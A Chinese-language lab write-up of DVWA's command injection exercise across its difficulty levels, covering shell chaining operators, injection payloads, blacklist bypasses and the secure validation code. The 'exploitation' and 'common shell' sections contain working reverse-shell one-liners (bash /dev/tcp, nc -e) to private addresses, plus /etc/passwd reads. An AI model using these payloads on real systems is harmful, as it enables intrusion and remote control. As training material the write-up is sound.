# DVWA-Command Injection


## low 

### Unix 系统，有几个字符可用于链或操作命令：

- `;`（分号）：允许按顺序执行多个命令。
- `&&`（AND）：仅在第一个命令成功执行（返回零退出状态）时才执行第二个命令。
- `||`（OR）：仅在第一个命令失败（返回非零退出状态）时才执行第二个命令。
- `&`（后台）：在后台执行命令，允许用户继续使用 shell。
- `|`（管道）：将第一个命令的输出作为第二个命令的输入。

```
command1; command2   # 执行 command1，然后执行 command2
command1 && command2 # 仅在 command1 成功时才执行 command2
command1 || command2 # 仅在 command1 失败时才执行 command2
command1 & command2  # 在后台执行 command1
command1 | command2  # 将 command1 的输出传递给 command2
```

### 重定向
```
# 将命令的输出重定向到文件
ls > files.txt

# 将命令的输出追加到文件的末尾
echo "Hello, World!" >> greetings.txt

# 将文件内容作为命令的输入
wc -l < example.txt

# 使用输入重定向 <<
cat << EOF > message.txt
Hello, 
This is a multi-line message.
EOF
```

### 使用
```
127.0.0.1 ; echo "123"
127.0.0.1 && echo "123"
x.x.x.x || echo "123"
127.0.0.1 & echo "123"
127.0.0.1 | grep "PING"
```


### 利用

```
127.0.0.1 ; cat /etc/passwd
127.0.0.1 && bash -c 'bash -i >& /dev/tcp/192.168.50.237/4444 0>&1'
x.x.x.x || pwd
127.0.0.1 & base64 index.php
```

常見shell 
```
bash -i >& /dev/tcp/192.168.50.46/4444 0>&1 
bash -c 'bash -i >& /dev/tcp/192.168.50.237/4444 0>&1'
nc -e /bin/bash 192.168.50.237 4444
```

## medium 


### 黑名單
```
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    ); 

```


## high


黑名單
```
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',        //這裡多了空格，這題基本不可能
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    ); 
    
    
    
    
    
    
|+空格 才會轉為空

command1|command2
command1 |command2

```

繞過:
```
127.0.0.1 |pwd
127.0.0.1|pwd
```





## impossible


```php=

// Get input
$target = $_REQUEST[ 'ip' ];
$target = stripslashes( $target );

// Split the IP into 4 octects
$octet = explode( ".", $target ); 


if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
    // If all 4 octets are int's put the IP back together.
    $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; 

/*
127.0.0.1 拆成 4份，確認只有4份
在驗證是否為數字
然後再用合併。
基本上繞不了。
*/
```

